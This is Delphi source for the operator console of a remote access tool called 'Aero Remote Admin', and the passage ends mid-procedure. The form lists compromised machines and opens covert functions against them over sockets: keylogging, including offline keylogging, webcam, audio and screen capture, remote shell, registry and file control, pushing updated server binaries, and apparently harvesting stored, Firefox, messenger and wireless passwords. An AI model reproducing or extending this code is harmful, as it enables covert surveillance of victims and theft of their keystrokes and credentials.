unit UnitConnectionForm;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ImgList, ComCtrls, Menus, IniFiles, StdCtrls, ExtCtrls,ScktComp,
  ShellApi, StrUtils, Gauges,  ToolWin, CommCtrl;

type
  TConnectionForm = class(TForm)
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    ScreenCapture1: TMenuItem;
    FileManager1: TMenuItem;
    FileSearch1: TMenuItem;
    WebcamCapture1: TMenuItem;
    ServiceManager1: TMenuItem;
    EditIdentification1: TMenuItem;
    WindowManager1: TMenuItem;
    ProcessManager1: TMenuItem;
    N2: TMenuItem;
    UpdateServer1: TMenuItem;
    OpenDialog1: TOpenDialog;
    AudioCapture1: TMenuItem;
    KeyLogger1: TMenuItem;
    InstalledApplications1: TMenuItem;
    RegistryEditor1: TMenuItem;
    RemoteShell1: TMenuItem;
    SystemInformation1: TMenuItem;
    ImageList3: TImageList;
    ShowThumbnails1: TMenuItem;
    TreeView1: TTreeView;
    Splitter1: TSplitter;
    Shutdown1: TMenuItem;
    Reboot1: TMenuItem;
    LogOff1: TMenuItem;
    OfflineScreenCapture1: TMenuItem;
    offlinekeylogger1: TMenuItem;
    Wireless1: TMenuItem;
    ProtectedStorage1: TMenuItem;
    Messenger1: TMenuItem;
    ransfers1: TMenuItem;
    UserFolder1: TMenuItem;
    Share1: TMenuItem;
    Ping1: TMenuItem;
    N1: TMenuItem;
    Uninstall1: TMenuItem;
    Close1: TMenuItem;
    Panel1: TPanel;
    ListView1: TListView;
    StatusBar1: TStatusBar;
    Gauge1: TGauge;
    Gauge2: TGauge;
    Timer2: TTimer;
    Show1: TMenuItem;
    ToolBar1: TToolBar;
    ToolButton1: TToolButton;
    ToolButton2: TToolButton;
    ToolButton3: TToolButton;
    ToolButton4: TToolButton;
    PopupMenu2: TPopupMenu;
    Downloads1: TMenuItem;
    Screen1: TMenuItem;
    Webcam1: TMenuItem;
    Firefox1: TMenuItem;
    Timer1: TTimer;
    Restart1: TMenuItem;
    StateImages: TImageList;
    Timer3: TTimer;
    ToolButton5: TToolButton;
    procedure ScreenCapture1Click(Sender: TObject);
    procedure FileManager1Click(Sender: TObject);
    procedure FileSearch1Click(Sender: TObject);
    procedure WebcamCapture1Click(Sender: TObject);
    procedure ServiceManager1Click(Sender: TObject);
    procedure EditIdentification1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure WindowManager1Click(Sender: TObject);
    procedure ProcessManager1Click(Sender: TObject);
    procedure UpdateServer1Click(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
    procedure ListView1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure FormCreate(Sender: TObject);
    procedure AudioCapture1Click(Sender: TObject);
    procedure KeyLogger1Click(Sender: TObject);
    procedure InstalledApplications1Click(Sender: TObject);
    procedure RegistryEditor1Click(Sender: TObject);
    procedure RemoteShell1Click(Sender: TObject);
    procedure SystemInformation1Click(Sender: TObject);
    procedure ShowThumbnails1Click(Sender: TObject);
    procedure TreeView1Collapsing(Sender: TObject; Node: TTreeNode;
      var AllowCollapse: Boolean);
    procedure TreeView1DblClick(Sender: TObject);
    procedure offlinekeylogger1Click(Sender: TObject);
    procedure OfflineScreenCapture1Click(Sender: TObject);
    procedure ProtectedStorage1Click(Sender: TObject);
    procedure Messenger1Click(Sender: TObject);
    procedure Wireless1Click(Sender: TObject);
    procedure ransfers1Click(Sender: TObject);
    procedure UserFolder1Click(Sender: TObject);
    procedure ListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure Shutdown1Click(Sender: TObject);
    procedure Reboot1Click(Sender: TObject);
    procedure LogOff1Click(Sender: TObject);
    procedure StatusBar1DrawPanel(StatusBar: TStatusBar;
      Panel: TStatusPanel; const Rect: TRect);
    procedure Timer2Timer(Sender: TObject);
    procedure Close1Click(Sender: TObject);
    procedure Share1Click(Sender: TObject);
    procedure Uninstall1Click(Sender: TObject);
    procedure Ping1Click(Sender: TObject);
    procedure Show1Click(Sender: TObject);
    procedure ListView1Deletion(Sender: TObject; Item: TListItem);
    procedure ToolButton1Click(Sender: TObject);
    procedure ToolButton2Click(Sender: TObject);
    procedure ToolButton3Click(Sender: TObject);
    procedure Downloads1Click(Sender: TObject);
    procedure Screen1Click(Sender: TObject);
    procedure Webcam1Click(Sender: TObject);
    procedure ListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure Firefox1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Restart1Click(Sender: TObject);
    procedure ListView1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Timer3Timer(Sender: TObject);
    procedure ToolButton5Click(Sender: TObject);
  private
    { Private declarations }
    OriginalListViewWindowProc : TWndMethod;
    //procedure ListViewWindowProcEx(var Message: TMessage);
  public
    { Public declarations }
    Total,Online: integer;
    GroupName: string;
    TabSheet: TTabSheet;
    procedure UpdateCaption;
    procedure ClickTheColumn;
    procedure ClickTheColumn2;
    procedure AddPicture(Li: TListItem; Bmp: TBitmap);
    function GetTheCol: TListColumn;
  end;

  TPingThread = class(TThread)
    procedure execute;override;
    public
     ConnectionForm: TConnectionForm;
     Listview1: TListview;
  end;

var
  LastSortedColumn: TListColumn;
  Ascending: boolean;
  PingThread: TPingThread;


implementation

{$R *.dfm}

uses
  UnitSharedData, UnitScreenCapture, UnitFileManager, UnitFileSearch,
  UnitWebcamCapture, UnitServiceManager, UnitEditIdentification, UnitMain,
  UnitWindowManager, UnitProcessManager, UnitAudioCapture, UnitKeyLogger,
  UnitInstalledApplications, UnitRegEdit, UnitRemoteShell, UnitSystemInfo,
  UnitPasswordAudit, UnitTransferManager, UnitSettings, UnitShareServer, UnitNotes;

procedure TPingThread.Execute;
var
  i: integer;
  SocketData: TSocketData;
  Time: string;
  TimeSincePing: integer;
  Data: string;
  NewLi: TListItem;
  DisconnectProc: procedure(Socket: TCustomWinSocket);
begin
  Time := '10000';
  exit;

  while True do begin
    Sleep(10000);
    Application.ProcessMessages;
    
    try

      for i := Listview1.Items.Count -1 downto 0 do begin
        Application.ProcessMessages;
        if Listview1.Items[i].Deleting then Continue;
        if Listview1.Items[i].Data = nil then Continue;
        try
          Application.ProcessMessages;
          SocketData := TSocketData(Listview1.Items[i].Data);
          if SocketData.MainSocket = nil then Continue;
          if GetTickCount - SocketData.PingSentAt < 30000 then Continue;
          if not SocketData.PingReceived then begin
            Application.ProcessMessages;
            if SocketData.SentFirstPing then begin
              Application.ProcessMessages;
              if SocketData.Ping = '-' then SocketData.Ping := Time else SocketData.Ping := inttostr(strtoint(SocketData.Ping) +  strtoint(Time));
              Listview1.Items[i].SubItems[10] := SocketData.Ping;
            end;
          end;
          Application.ProcessMessages;
          SocketData.SentFirstPing := True;
          Application.ProcessMessages;
          SocketData.PingReceived := False;
          Data := 'Ping';
          Data := Compress(SocketData,Data);
          Data := inttostr(Length(Data)) + '|' + Data;
          SocketData.PingSentAt := GetTickCount;
          Application.ProcessMessages;
          try
            SocketData.MainSocket.SendText(Data);
          except
            Listview1.Items[i].ImageIndex := 0;
            SocketData.Ping := '-';
            SocketData.Idle := '-';
            Listview1.Items[i].SubItems[10] := '-';
            Listview1.Items[i].SubItems[11] := '-';
            if Settings.CheckBox6.Checked then DoPopup('Lost Connection',SocketData);
            if Settings.CheckBox12.Checked then begin
              Listview1.Items[i].Data := nil;
              Listview1.Items[i].Delete;
              SocketData.ListItem := nil;
            end else begin
              if ClientForm.GroupOnlineContatcs1.Checked then begin
                NewLi := SocketData.ConnectionForm.ListView1.Items.Add;
                NewLi.Assign(Listview1.Items[i]);
                NewLi.SubItemImages[1] := Listview1.Items[i].SubItemImages[1];
                NewLi.SubItemImages[8] := Listview1.Items[i].SubItemImages[8];
                SocketData.ListItem.Delete;
                SocketData.ListItem := NewLi;
              end;
            end;
            SocketData.ConnectionForm.UpdateCaption;
            Application.ProcessMessages;
          end;
        except
        end;
      end;

    except
    end;

  end;

end;

function TConnectionForm.GetTheCol: TListColumn;
begin
  Result := LastSortedColumn;
end;

procedure TConnectionForm.AddPicture(Li: TListItem; Bmp: TBitmap);
begin
  if Li.ImageIndex = 0 then begin

    try
      Li.ImageIndex := ImageList3.Add(Bmp,nil);
    except
    end;

  end else begin

    try
      ImageList3.Replace(Li.ImageIndex,Bmp,nil);
    except
    end;

  end;
end;

procedure TConnectionForm.UpdateCaption;
var
  i: integer;
  //Total,Online: integer;
  x1,x2: integer;
  Ini: TIniFile;
begin
  Online := 0;
  Total := 0;
  for i := 0 to Listview1.Items.Count -1 do begin
    if Listview1.Items[i].Deleting then continue;
    Inc(Total);
    if Listview1.Items[i].Data = nil then Continue;
    if TSocketData(Listview1.Items[i].Data).MainSocket <> nil then Inc(Online);
  end;
  Caption := GroupName + ' (' + inttostr(Online) + '/' + inttostr(Total) + ')';
  TabSheet.Caption := Caption;

  x1 := 0;
  x2 := 0;
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    Inc(x1,TConnectionForm(Screen.Forms[i]).Total);
    Inc(x2,TConnectionForm(Screen.Forms[i]).Online);
  end;

  ClientForm.ScreenTotal := x1;
  ClientForm.ScreenOnline := x2;
  ClientForm.Caption := 'Aero Remote Admin' + ' - ' + inttostr(ClientForm.ScreenOnline) + '/' +  inttostr(ClientForm.ScreenTotal) + ' Users Online';

  Application.Title := ClientForm.Caption;

  if ClientForm.ScreenOnline = 0 then begin
    ClientForm.PageControl1.Hide;
    ClientForm.RichEdit1.Show;
    ClientForm.Button1.Show;
  end else begin
    ClientForm.PageControl1.Show;
    ClientForm.RichEdit1.Hide;
    ClientForm.Button1.Hide;
  end;
  ClientForm.Refresh;
end;

procedure TConnectionForm.ScreenCapture1Click(Sender: TObject);
var
  ScreenCapture: TScreenCapture;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  ScreenCapture := TScreenCapture.Create(nil);
  ScreenCapture.Panel1.BringToFront;
  ScreenCapture.MenuItem1.Checked := StrToBool(SocketData.ServerData.OfflineScreenCapture);
  ScreenCapture.Caption := SocketData.ServerData.Name + ' - Screen Capture - [Offline]';
  ScreenCapture.SocketData := SocketData;
  ScreenCapture.MainSocket := SocketData.MainSocket;
  ScreenCapture.Offline := False;

  ScreenCapture.Group := SocketData.ServerData.Group;
  ScreenCapture.Computer := SocketData.ServerData.Computer;
  ScreenCapture.User := SocketData.ServerData.User;

  SocketData.Form := ScreenCapture;
  SendData(SocketData.MainSocket,'NewConnection|ScreenCaptureSocket|' + inttostr(ScreenCapture.Handle));
  ScreenCapture.Show;
end;

procedure TConnectionForm.OfflineScreenCapture1Click(Sender: TObject);
var
  ScreenCapture: TScreenCapture;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  ScreenCapture := TScreenCapture.Create(nil);
  ScreenCapture.Panel2.BringToFront;
  ScreenCapture.MenuItem1.Checked := StrToBool(SocketData.ServerData.OfflineScreenCapture);
  ScreenCapture.Caption := SocketData.ServerData.Name + ' - Offline Screen Capture - [Offline]';
  ScreenCapture.SocketData := SocketData;
  ScreenCapture.MainSocket := SocketData.MainSocket;
  ScreenCapture.Offline := True;
  SocketData.Form := ScreenCapture;
  ScreenCapture.Group := SocketData.ServerData.Group;
  ScreenCapture.Computer := SocketData.ServerData.Computer;
  ScreenCapture.User := SocketData.ServerData.User;

  SendData(SocketData.MainSocket,'NewConnection|ScreenCaptureSocket|' + inttostr(ScreenCapture.Handle));
  ScreenCapture.Show;
end;

procedure TConnectionForm.FileManager1Click(Sender: TObject);
var
  FileManager: TFileManager;
  SocketData: TSocketData;
  Data,Path: string;
  Ini: TIniFile;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  FileManager := TFileManager.Create(nil);
  FileManager.Caption := SocketData.ServerData.Name + ' - File Manager - [Offline]';
  FileManager.SocketData := SocketData;
  FileManager.MainSocket := SocketData.MainSocket;
  SocketData.Form := FileManager;
  FileManager.Group := SocketData.ServerData.Group;
  FileManager.Computer := SocketData.ServerData.Computer;
  FileManager.User := SocketData.ServerData.User;
  FileManager.IniFile := SocketData.MainPath + 'Settings.Ini';

  Ini := TIniFile.Create(FileManager.IniFile);
  FileManager.LastPath := Ini.ReadString('FileManager','LastPath',SocketData.ServerData.RootDir);
  FileManager.Edit1.Text := FileManager.LastPath;
  Ini.Free;

  if (Settings.CheckBox13.Checked) and (LoadDataFromStream(SocketData.CachePath + 'Drives.cache',Data)) then begin
    FileManager.ParseData(nil,'DriveList|' + Data);

    Path := FileManager.LastPath;
    Path := AnsiReplaceStr(Path,':','');
    Path := AnsiReplaceStr(Path,'\','');

    LoadDataFromStream(SocketData.CachePath + Path + '-Folders.cache',Data);
    FileManager.ParseData(nil,'FolderList|' + Data);

    LoadDataFromStream(SocketData.CachePath + Path + '-Files.cache',Data);
    FileManager.ParseData(nil,'FileList|' + Data);
  end;

  SendData(SocketData.MainSocket,'NewConnection|FileManagerSocket|' + inttostr(FileManager.Handle));
  FileManager.Show;
end;

procedure TConnectionForm.FileSearch1Click(Sender: TObject);
var
  FileSearch: TFileSearch;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  FileSearch := TFileSearch.Create(nil);
  FileSearch.Caption := SocketData.ServerData.Name + ' - File Search - [Offline]';
  FileSearch.SocketData := SocketData;
  FileSearch.MainSocket := SocketData.MainSocket;
  SocketData.Form := FileSearch;
    FileSearch.Group := SocketData.ServerData.Group;
  FileSearch.Computer := SocketData.ServerData.Computer;
  FileSearch.User := SocketData.ServerData.User;

  SendData(SocketData.MainSocket,'NewConnection|FileSearchSocket|' + inttostr(FileSearch.Handle));
  FileSearch.Show;
end;

procedure TConnectionForm.WebcamCapture1Click(Sender: TObject);
var
  WebcamCapture: TWebcamCapture;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  WebcamCapture := TWebcamCapture.Create(nil);
  WebcamCapture.Caption := SocketData.ServerData.Name + ' - Webcam Capture - [Offline]';
  WebcamCapture.SocketData := SocketData;
  WebcamCapture.MainSocket := SocketData.MainSocket;
  SocketData.Form := WebcamCapture;
  WebcamCapture.Group := SocketData.ServerData.Group;
  WebcamCapture.Computer := SocketData.ServerData.Computer;
  WebcamCapture.User := SocketData.ServerData.User;

  SendData(SocketData.MainSocket,'NewConnection|WebcamCaptureSocket|' + inttostr(WebcamCapture.Handle));
  WebcamCapture.Show;
end;

procedure TConnectionForm.ServiceManager1Click(Sender: TObject);
var
  ServiceManager: TServiceManager;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  ServiceManager := TServiceManager.Create(nil);
  ServiceManager.Caption := SocketData.ServerData.Name + ' - Service Manager - [Offline]';
  ServiceManager.SocketData := SocketData;
  ServiceManager.MainSocket := SocketData.MainSocket;
  ServiceManager.Group := SocketData.ServerData.Group;
  ServiceManager.Computer := SocketData.ServerData.Computer;
  ServiceManager.User := SocketData.ServerData.User;

  SocketData.Form := ServiceManager;
  SendData(SocketData.MainSocket,'NewConnection|ServiceManagerSocket|' + inttostr(ServiceManager.Handle));
  ServiceManager.Show;
end;


procedure TConnectionForm.EditIdentification1Click(Sender: TObject);
var
  Ini: TIniFile;
  NewConnectionForm: TCOnnectionForm;
  SocketData: TSocketData;
  Li: TListItem;
  i: integer;
begin
  EditIdentification.ComboBox1.Text := GroupName;
  EditIdentification.ComboBox2.Text := Listview1.Selected.Caption;
  if EditIdentification.ShowModal <> mrok then exit;


  SocketData := TSocketData(Listview1.Selected.Data);
  SocketData.ServerData.Group := ParseName(SocketData,EditIdentification.ComboBox1.Text);
  SocketData.ServerData.Name := ParseName(SocketData,EditIdentification.ComboBox2.Text);

  Ini := TIniFile.Create(SocketData.MainPath + 'Settings.Ini');
  try
    Ini.WriteString('Identification','Group',EditIdentification.ComboBox1.Text);
    Ini.WriteString('Identification','Name',EditIdentification.ComboBox2.Text);
  except
  end;
  Ini.Free;

    NewConnectionForm := FindConnectionForm(SocketData.ServerData.Group);

    if (ClientForm.GroupOnlineContatcs1.Checked) and (SocketData.MainSocket <> nil) then begin
      Li := NewConnectionForm.ListView1.Items.Insert(0);
    end else begin
      Li := NewConnectionForm.ListView1.Items.Add;  //Insert(NewConnectionForm.ListView1.Items.Count -1);
    end;

    Li.ImageIndex := 0; //-1
    Li.Caption := SocketData.ServerData.Name;
    Li.SubItems.Add(Listview1.Selected.SubItems[0]);
    Li.SubItems.Add(Listview1.Selected.SubItems[1]);
    Li.SubItems.Add(Listview1.Selected.SubItems[2]);
    Li.SubItems.Add(Listview1.Selected.SubItems[3]);
    Li.SubItems.Add(Listview1.Selected.SubItems[4]);
    Li.SubItems.Add(Listview1.Selected.SubItems[5]);
    Li.SubItems.Add(Listview1.Selected.SubItems[6]);
    Li.SubItems.Add(Listview1.Selected.SubItems[7]);
    Li.SubItems.Add(Listview1.Selected.SubItems[8]);
    Li.SubItems.Add(Listview1.Selected.SubItems[9]);
    Li.SubItems.Add(Listview1.Selected.SubItems[10]);
    Li.SubItems.Add(Listview1.Selected.SubItems[11]);
    Li.Data := Listview1.Selected.Data;
    SocketData.ListItem := Li;
    SocketData.ConnectionForm := NewConnectionForm;

    Li.ImageIndex := Listview1.Selected.ImageIndex;
    Li.SubItemImages[1] := Listview1.Selected.SubItemImages[1];
    Li.SubItemImages[8] := Listview1.Selected.SubItemImages[8];
    if SocketData.ServerData.Special = 'True' then Li.StateIndex := 1 else Li.StateIndex := 0;

    if NewConnectionForm.ShowThumbnails1.Checked then begin
      Li.ImageIndex := 0;
      SendData(SocketData.MainSocket,'ScreenShot');
    end;

    NewConnectionForm.UpdateCaption;
    NewConnectionForm.ClickTheColumn;
    UpdateCaption;
    Listview1.Selected.Delete;

end;

procedure TConnectionForm.FormClose(Sender: TObject; var Action: TCloseAction);
begin

  Action := caFree;
end;

procedure TConnectionForm.WindowManager1Click(Sender: TObject);
var
  WindowManager: TWindowManager;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  WindowManager := TWindowManager.Create(nil);
  WindowManager.Caption := SocketData.ServerData.Name + ' - Window Manager - [Offline]';
  WindowManager.SocketData := SocketData;
  WindowManager.MainSocket := SocketData.MainSocket;
  SocketData.Form := WindowManager;
      WindowManager.Group := SocketData.ServerData.Group;
  WindowManager.Computer := SocketData.ServerData.Computer;
  WindowManager.User := SocketData.ServerData.User;

  SendData(SocketData.MainSocket,'NewConnection|WindowManagerSocket|' + inttostr(WindowManager.Handle));
  WindowManager.Show;
end;

procedure TConnectionForm.ProcessManager1Click(Sender: TObject);
var
  ProcessManager: TProcessManager;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  ProcessManager := TProcessManager.Create(nil);
  ProcessManager.Caption := SocketData.ServerData.Name + ' - Process Manager - [Offline]';
  ProcessManager.SocketData := SocketData;
  ProcessManager.MainSocket := SocketData.MainSocket;
  SocketData.Form := ProcessManager;
      ProcessManager.Group := SocketData.ServerData.Group;
  ProcessManager.Computer := SocketData.ServerData.Computer;
  ProcessManager.User := SocketData.ServerData.User;

  SendData(SocketData.MainSocket,'NewConnection|ProcessManagerSocket|' + inttostr(ProcessManager.Handle));
  ProcessManager.Show;
end;

procedure TConnectionForm.UpdateServer1Click(Sender: TObject);
var
  Stream: TMemoryStream;
  Data: string;
  SocketData: TSocketData;
  i: integer;
begin
  if not opendialog1.Execute then exit;

  for i := Listview1.Items.Count -1 downto 0 do begin

    if not Listview1.Items[i].Selected then Continue;
    if Listview1.Items[i].Data = nil then Continue;

    SocketData := TSocketData(Listview1.Items[i].Data);
    if SocketData.MainSocket = nil then Continue;

    SendData(SocketData.MainSocket,'NewConnection|UpdateServer|' + OpenDialog1.FileName);

  end;

end;

procedure TConnectionForm.ListView1DblClick(Sender: TObject);
var
  SocketData: TSocketData;
begin
  if not assigned(Listview1.Selected) then exit;
  SocketData := TSocketData(Listview1.Selected.Data);
  ShellExecute(0,'explore',pchar(SocketData.MainPath),'','',SW_SHOWNORMAL);
end;

procedure TConnectionForm.ListView1SelectItem(Sender: TObject;  Item: TListItem; Selected: Boolean);
var
  SocketData: TSocketData;
begin
  Timer2.Enabled := True;
end;

procedure TConnectionForm.FormCreate(Sender: TObject);
var
  Ini: TIniFile;
  Num: integer;
begin
 // OriginalListViewWindowProc := ListView1.WindowProc;
  //ListView1.WindowProc := ListViewWindowProcEx;

  Ascending := True;
  
  Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');
    ListView1.Column[0].Width := Ini.ReadInteger('Client','Col0',ListView1.Column[0].Width);
    ListView1.Column[1].Width := Ini.ReadInteger('Client','Col1',ListView1.Column[1].Width);
    ListView1.Column[2].Width := Ini.ReadInteger('Client','Col2',ListView1.Column[2].Width);
    ListView1.Column[3].Width := Ini.ReadInteger('Client','Col3',ListView1.Column[3].Width);
    ListView1.Column[4].Width := Ini.ReadInteger('Client','Col4',ListView1.Column[4].Width);
    ListView1.Column[5].Width := Ini.ReadInteger('Client','Col5',ListView1.Column[5].Width);
    ListView1.Column[6].Width := Ini.ReadInteger('Client','Col6',ListView1.Column[6].Width);
    ListView1.Column[7].Width := Ini.ReadInteger('Client','Col7',ListView1.Column[7].Width);
    ListView1.Column[8].Width := Ini.ReadInteger('Client','Col8',ListView1.Column[8].Width);
    ListView1.Column[9].Width := Ini.ReadInteger('Client','Col9',ListView1.Column[9].Width);
    ListView1.Column[10].Width := Ini.ReadInteger('Client','Col10',ListView1.Column[10].Width);
    ListView1.Column[11].Width := Ini.ReadInteger('Client','Col11',ListView1.Column[11].Width);
    ListView1.Column[12].Width := Ini.ReadInteger('Client','Col12',ListView1.Column[12].Width);
  Ini.Free;

  Listview1.DoubleBuffered := true;

  Gauge1.Parent := StatusBar1;
  Gauge2.Parent := StatusBar1;
  Treeview1.Items[0].Expand(True);

  PingThread := TPingThread.Create(True);
  PingThread.ConnectionForm := Self;
  PingThread.Listview1 := Listview1;
  PingThread.Resume; 

end;

procedure TConnectionForm.AudioCapture1Click(Sender: TObject);
var
  AudioCapture: TAudioCapture;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  AudioCapture := TAudioCapture.Create(nil);
  AudioCapture.Caption := SocketData.ServerData.Name + ' - Audio Capture - [Offline]';
  AudioCapture.SocketData := SocketData;
  AudioCapture.MainSocket := SocketData.MainSocket;
  SocketData.Form := AudioCapture;
  AudioCapture.Group := SocketData.ServerData.Group;
  AudioCapture.Computer := SocketData.ServerData.Computer;
  AudioCapture.User := SocketData.ServerData.User;

  SendData(SocketData.MainSocket,'NewConnection|AudioCaptureSocket|' + inttostr(AudioCapture.Handle));
  AudioCapture.Show;
end;

procedure TConnectionForm.KeyLogger1Click(Sender: TObject);
var
  KeyLogger: TKeyLogger;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  KeyLogger := TKeyLogger.Create(nil);
  KeyLogger.Panel1.BringToFront;
  KeyLogger.Active2.Checked := StrToBool(SocketData.ServerData.OfflineLogger);
  KeyLogger.Caption := SocketData.ServerData.Name + ' - Key Logger - [Offline]';
  KeyLogger.SocketData := SocketData;
  KeyLogger.MainSocket := SocketData.MainSocket;
  KeyLogger.Offline := False;
  SocketData.Form := KeyLogger;
  KeyLogger.Group := SocketData.ServerData.Group;
  KeyLogger.Computer := SocketData.ServerData.Computer;
  KeyLogger.User := SocketData.ServerData.User;

  SendData(SocketData.MainSocket,'NewConnection|KeyLoggerSocket|' + inttostr(KeyLogger.Handle));
  KeyLogger.Show;
end;

procedure TConnectionForm.InstalledApplications1Click(Sender: TObject);
var
  InstalledApplications: TInstalledApplications;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  InstalledApplications := TInstalledApplications.Create(nil);
  InstalledApplications.Caption := SocketData.ServerData.Name + ' - Installed Applications - [Offline]';
  InstalledApplications.SocketData := SocketData;
  InstalledApplications.MainSocket := SocketData.MainSocket;
      InstalledApplications.Group := SocketData.ServerData.Group;
  InstalledApplications.Computer := SocketData.ServerData.Computer;
  InstalledApplications.User := SocketData.ServerData.User;

  SocketData.Form := InstalledApplications;
  SendData(SocketData.MainSocket,'NewConnection|InstalledApplicationsSocket|' + inttostr(InstalledApplications.Handle));
  InstalledApplications.Show;
end;

procedure TConnectionForm.RegistryEditor1Click(Sender: TObject);
var
  RegEdit: TRegEdit;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  RegEdit := TRegEdit.Create(nil);
  RegEdit.Caption := SocketData.ServerData.Name + ' - Registry Editor - [Offline]';
  RegEdit.SocketData := SocketData;
  RegEdit.MainSocket := SocketData.MainSocket;
    RegEdit.Group := SocketData.ServerData.Group;
  RegEdit.Computer := SocketData.ServerData.Computer;
  RegEdit.User := SocketData.ServerData.User;

  SocketData.Form := RegEdit;
  SendData(SocketData.MainSocket,'NewConnection|RegEditSocket|' + inttostr(RegEdit.Handle));
  RegEdit.Show;
end;

procedure TConnectionForm.RemoteShell1Click(Sender: TObject);
var
  RemoteShell: TRemoteShell;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  RemoteShell := TRemoteShell.Create(nil);
  RemoteShell.Caption := SocketData.ServerData.Name + ' - Remote Shell - [Offline]';
  RemoteShell.SocketData := SocketData;
  RemoteShell.MainSocket := SocketData.MainSocket;
  SocketData.Form := RemoteShell;
      RemoteShell.Group := SocketData.ServerData.Group;
  RemoteShell.Computer := SocketData.ServerData.Computer;
  RemoteShell.User := SocketData.ServerData.User;

  SendData(SocketData.MainSocket,'NewConnection|RemoteShellSocket|' + inttostr(RemoteShell.Handle));
  RemoteShell.Show;
end;

procedure TConnectionForm.SystemInformation1Click(Sender: TObject);
var
  SystemInfo: TSystemInformation;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  SystemInfo := TSystemInformation.Create(nil);
  SystemInfo.Caption := SocketData.ServerData.Name + ' - System Information  - [Offline]';
  SystemInfo.SocketData := SocketData;
  SystemInfo.MainSocket := SocketData.MainSocket;
  SocketData.Form := SystemInfo;

  SystemInfo.Group := SocketData.ServerData.Group;
  SystemInfo.Computer := SocketData.ServerData.Computer;
  SystemInfo.User := SocketData.ServerData.User;

  SendData(SocketData.MainSocket,'NewConnection|SystemInfoSocket|' + inttostr(SystemInfo.Handle));
  SystemInfo.Show;
end;

function SortByColumn(Item1, Item2: TListItem; Data: integer): integer; stdcall;
var
  n1,n2: int64;
begin
  //Application.ProcessMessages;

  if ClientForm.GroupOnlineContatcs1.Checked then begin
    if (Item1.ImageIndex = 0) and (Item2.ImageIndex > 0) then begin
      Result := 1;
      exit;
    end;

    if (Item2.ImageIndex = 0) and (Item1.ImageIndex > 0) then begin
      Result := -1;
      exit;
    end;
  end;

  if (LastSortedColumn.Caption = 'Memory') or
     (LastSortedColumn.Caption = 'Processor') or
     (LastSortedColumn.Caption = 'Ping') or
     (LastSortedColumn.Caption = 'Wan') or
     (LastSortedColumn.Caption = 'Idle') then begin

      if LastSortedColumn.Caption = 'Wan' then begin
        n1 := TSocketData(Item1.Data).FlagIndex;
        n2 := TSocketData(Item2.Data).FlagIndex;
      end;

      if LastSortedColumn.Caption = 'Memory' then begin
        n1 := strtoint64(TSocketData(Item1.Data).ServerData.Memory);
        n2 := strtoint64(TSocketData(Item2.Data).ServerData.Memory);
      end;

      if LastSortedColumn.Caption = 'Processor' then begin
        n1 := strtoint(TSocketData(Item1.Data).ServerData.Processor);
        n2 := strtoint(TSocketData(Item2.Data).ServerData.Processor);
      end;

      if LastSortedColumn.Caption = 'Idle' then begin
        if TSocketData(Item1.Data).Idle = '-' then n1 := high(int64) else n1 := strtoint(TSocketData(Item1.Data).Idle);
        if TSocketData(Item2.Data).Idle = '-' then n2 := high(int64) else n2 := strtoint(TSocketData(Item2.Data).Idle);
      end;

      if LastSortedColumn.Caption = 'Ping' then begin
        if TSocketData(Item1.Data).Ping = '-' then n1 := high(int64) else n1 := strtoint(TSocketData(Item1.Data).Ping);
        if TSocketData(Item2.Data).Ping = '-' then n2 := high(int64) else n2 := strtoint(TSocketData(Item2.Data).Ping);
      end;

      if (n1 = n2) then Result := 0 else if (n1 > n2) then Result := 1 else Result := -1;

  end else begin
    Result := 0;
    if Data = 0 then begin
      Result := AnsiCompareText(Item1.Caption, Item2.Caption)
    end else begin
      Result := AnsiCompareText(Item1.SubItems[Data-1],Item2.SubItems[Data-1]);
    end;
  end;

  if not Ascending then Result := -Result;
end;

procedure TConnectionForm.ListView1ColumnClick(Sender: TObject; Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to Listview1.Columns.Count -1 do Listview1.Column[i].ImageIndex := -1;
  if Ascending then Column.ImageIndex := 6 else Column.ImageIndex := 5;
  LastSortedColumn := Column;
  Listview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TConnectionForm.ClickTheColumn;
var
  i: integer;
begin
  if LastSortedColumn = nil then exit;
  Listview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TConnectionForm.ClickTheColumn2;
begin
  Ascending := not Ascending;
  if LastSortedColumn = nil then LastSortedColumn := Listview1.Columns[0];
